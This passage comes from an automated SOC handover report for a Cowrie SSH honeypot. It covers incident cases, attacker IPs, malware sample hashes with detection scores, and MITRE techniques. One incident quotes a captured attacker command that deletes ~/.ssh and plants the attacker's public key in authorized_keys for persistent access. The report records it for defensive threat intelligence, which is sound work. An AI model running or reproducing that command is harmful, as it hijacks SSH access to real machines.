- [ ] Submit `154.221.28[.]214` to AbuseIPDB if not already reported
- [ ] Block `154.221.28[.]214` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c59407be3780

| Field | Detail |
|---|---|
| **Source IP** | `186.219.184[.]142` |
| **First Seen** | 2026-04-20 20:35 |
| **Last Seen** | 2026-04-20 20:35 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-20 20:35:36` | `cowrie.session.connect` |
| `2026-04-20 20:35:36` | `cowrie.client.version` |
| `2026-04-20 20:35:36` | `cowrie.client.kex` |
| `2026-04-20 20:35:38` | `cowrie.login.success` |
| `2026-04-20 20:35:38` | `cowrie.session.params` |
| `2026-04-20 20:35:38` | `cowrie.command.input` |
| `2026-04-20 20:35:38` | `cowrie.command.failed` |
| `2026-04-20 20:35:39` | `cowrie.log.closed` |
| `2026-04-20 20:35:40` | `cowrie.session.params` |
| `2026-04-20 20:35:40` | `cowrie.command.input` |
| `2026-04-20 20:35:40` | `cowrie.session.file_download` |
| `2026-04-20 20:35:40` | `cowrie.log.closed` |
| `2026-04-20 20:35:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `186.219.184[.]142` to AbuseIPDB if not already reported
- [ ] Block `186.219.184[.]142` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f393692a96f6

| Field | Detail |
|---|---|
| **Source IP** | `186.219.184[.]142` |
| **First Seen** | 2026-04-20 20:35 |
| **Last Seen** | 2026-04-20 20:35 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-20 20:35:44` | `cowrie.session.connect` |
| `2026-04-20 20:35:44` | `cowrie.client.version` |
| `2026-04-20 20:35:44` | `cowrie.client.kex` |
| `2026-04-20 20:35:46` | `cowrie.login.success` |
| `2026-04-20 20:35:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `186.219.184[.]142` to AbuseIPDB if not already reported
- [ ] Block `186.219.184[.]142` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `13.81.183[.]28` | **25** | 2026-04-20 19:49 | 2026-04-20 20:07 | 0m | 25 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `154.221.28[.]214` | **25** | 2026-04-20 19:48 | 2026-04-20 20:33 | 0m | 25 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `186.219.184[.]142` | **25** | 2026-04-20 19:50 | 2026-04-20 20:35 | 1m | 25 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `209.141.47[.]217` | **25** | 2026-04-20 19:51 | 2026-04-20 20:31 | 0m | 25 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `46.253.45[.]10` | **25** | 2026-04-20 19:52 | 2026-04-20 20:27 | 0m | 25 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `106.75.163[.]253` | **2** | 2026-04-20 20:06 | 2026-04-20 20:08 | 2m | 0 | `T1592` | 🟢 LOW |
| `101.35.145[.]159` | 1 | 2026-04-20 19:53 | 2026-04-20 19:55 | 120s | 0 | `T1592` | 🟢 LOW |
| `103.113.105[.]228` | 1 | 2026-04-20 19:50 | 2026-04-20 19:50 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `106.247.141[.]104` | 1 | 2026-04-20 19:46 | 2026-04-20 19:47 | 30s | 0 | `T1592` | 🟢 LOW |
| `114.173.82[.]233` | 1 | 2026-04-20 20:11 | 2026-04-20 20:12 | 12s | 0 | `T1592` | 🟢 LOW |
| `120.86.119[.]165` | 1 | 2026-04-20 19:43 | 2026-04-20 19:44 | 60s | 1 | `T1110.001` | 🟢 LOW |
| `14.103.102[.]130` | 1 | 2026-04-20 19:51 | 2026-04-20 19:53 | 120s | 0 | `T1592` | 🟢 LOW |
| `203.0.104[.]170` | 1 | 2026-04-20 19:51 | 2026-04-20 19:53 | 120s | 0 | `T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (22 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/76 ✅ |
| `12de77bef9500e41c76a2200bc6fa712e7e3fc188dfdd92a764a22c3421b7208` | ELF Binary (Linux executable) (x86-64 64-bit) | `12de77bef9500e41...` | 44/100 | 🟡 MEDIUM | **36/76** 🔴 |
| `17b7944a9b8a4e3edb1b1f2e743ae5d06dae0a8c3a9531e94970aa3261c2cab5` | ELF Binary (Linux executable) (x86-64 64-bit) | `17b7944a9b8a4e3e...` | 45/100 | 🟡 MEDIUM | **38/76** 🔴 |
| `38ef0580d99fb1524c13f8dc4981fe2757deb290b29f947ebc24b4b359756f63` | ELF Binary (Linux executable) (x86-64 64-bit) | `38ef0580d99fb152...` | 44/100 | 🟡 MEDIUM | **36/76** 🔴 |
| `72ce5b00ca4bfa0c18fcdf03a15e5391a85d81300783626598fe7e022e0ec538` | ELF Binary (Linux executable) (x86-64 64-bit) | `72ce5b00ca4bfa0c...` | 44/100 | 🟡 MEDIUM | **36/76** 🔴 |
| `776c0fccae481c384f5636903ce500fae22803cf8778ec9a029956bb85a68010` | ELF Binary (Linux executable) (x86-64 64-bit) | `776c0fccae481c38...` | 43/100 | 🟡 MEDIUM | **33/76** 🔴 |
| `77c2e7968f7695c1bfbe08f0c455cc95479a74cc7fdb432667e29bab08515ce1` | ELF Binary (Linux executable) (ARM 32-bit) | `77c2e7968f7695c1...` | 30/100 | 🟢 LOW | Not in VT |
| `7a9da7d10aa80b0f9e2e3f9e518030c86026a636e0b6de35905e15dd4c8e3e2d` | ELF Binary (Linux executable) (x86-64 64-bit) | `7a9da7d10aa80b0f...` | 45/100 | 🟡 MEDIUM | **39/76** 🔴 |
| `8daf92f0870c58ece8b68a3057c3ab6e8477215f853c54cdfe790acf1141161d` | ELF Binary (Linux executable) (ARM 32-bit) | `8daf92f0870c58ec...` | 44/100 | 🟡 MEDIUM | **37/76** 🔴 |
| `98babd858ec296d43844c96d53ff8713c44a451ba6e05b89d64c772828a0514d` | ELF Binary (Linux executable) (x86-64 64-bit) | `98babd858ec296d4...` | 44/100 | 🟡 MEDIUM | **37/76** 🔴 |
| `a04ac6d98ad989312783d4fe3456c53730b212c79a426fb215708b6c6daa3de3` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 49/100 | 🟡 MEDIUM | **50/76** 🔴 |
| `a2812d2ca38cf4e519e386901fb89c393d891417a168a278bbb9b9d4f38145cc` | ELF Binary (Linux executable) (x86-64 64-bit) | `a2812d2ca38cf4e5...` | 43/100 | 🟡 MEDIUM | **33/76** 🔴 |
| `a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2` | Unknown binary | `a8460f446be54041...` | 11/100 | 🟢 LOW | **30/76** 🔴 |
| `db2b1183a337cdf116ec3158067f70502e4534b6c27dd3a984c0bacb030732d5` | ELF Binary (Linux executable) (x86-64 64-bit) | `db2b1183a337cdf1...` | 43/100 | 🟡 MEDIUM | **34/76** 🔴 |
| `e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `e99df510c24950e447f6a471be7fb1b1f7716b0e882005db3511327cbc27b9ff` | ELF Binary (Linux executable) (ARM 32-bit) | `e99df510c24950e4...` | 30/100 | 🟢 LOW | 0/72 ✅ |
| `f200744b6900aeb0a27df08c71fc28a7f07b0aee21e844beca214eb8c4ab58dd` | ELF Binary (Linux executable) (x86-64 64-bit) | `f200744b6900aeb0...` | 43/100 | 🟡 MEDIUM | **34/76** 🔴 |
| `tmp3v3avwej` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `tmp41sthfqu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 49/100 | 🟡 MEDIUM | **50/76** 🔴 |
| `tmpjyzmzmsu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 49/100 | 🟡 MEDIUM | **50/76** 🔴 |
| `tmpw4ocpnlc` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 49/100 | 🟡 MEDIUM | **50/76** 🔴 |
| `tmpzmvvpi6d` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 49/100 | 🟡 MEDIUM | **50/76** 🔴 |

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `101.35.145[.]159` | CN | Tencent Cloud Computing (Beijing) Co., Ltd | **100** ⚠️ | 0 |
| `106.75.163[.]253` | CN | Shanghai UCloud Information Technology Company Limited | **100** ⚠️ | 14 |
| `106.247.141[.]104` | KR | LG DACOM Corporation | **100** ⚠️ | 23 |
| `46.253.45[.]10` | ES | Anxanet Operadors de Xarxes, S.L. | **100** ⚠️ | 50 |
| `186.219.184[.]142` | BR | Tudo Internet | **100** ⚠️ | 32 |
| `103.113.105[.]228` | IN | Ekowebtech It Services Pvt Ltd | **100** ⚠️ | 50 |
| `203.0.104[.]170` | CN | CHINANET Guangdong province network | **100** ⚠️ | 50 |
| `13.81.183[.]28` | NL | Microsoft Corporation | **100** ⚠️ | 50 |
| `154.221.28[.]214` | HK | Yisu Cloud Ltd | **100** ⚠️ | 50 |
| `209.141.47[.]217` | US | FranTech Solutions | **100** ⚠️ | 50 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 278 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 148 |
| [T1110.001](https://attack.mitre.org/techniques/T1110/001) | 127 |
| [T1021.004](https://attack.mitre.org/techniques/T1021/004) | 74 |
| [T1105](https://attack.mitre.org/techniques/T1105) | 74 |

---

## 🔕 False Positive Summary (4 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 0 below threshold 25 | 1 |
| AbuseIPDB score 11 below threshold 25 | 1 |
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 2 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 286 cases |
| Tool 34  | Credential Extractor        | ✅ 275 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 2 fingerprints |
| Tool 36  | Command Clustering          | ✅ 1 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 17 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 4 filtered (1.4%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 16 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 22 files |
| Tool 33  | YARA Classifier             | ✅ 8 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 148 priority case(s) shown individually · 13 recon entry/entries in table (6 group(s) consolidating 127 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `nikhilsalunkemumbai/thir-live` · Cowrie SSH Honeypot · AWS EC2_  
_Report time: 2026-04-20T20:54:04Z_
